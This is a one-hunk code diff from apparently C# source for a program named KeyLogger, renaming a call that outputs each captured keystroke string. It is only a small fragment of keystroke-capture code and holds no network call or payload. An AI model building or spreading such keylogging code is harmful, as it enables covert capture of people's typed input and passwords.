@@ -58,7 +58,7 @@ namespace KeyLogger
             else str = keyMap[KeyboardStatus.getKeyCode()].ToString();
 
             // Write !
-           TextPrinter.write(str);
+           TextPrinter.print(str);
         }
 
         // Handle the KeyDown Event
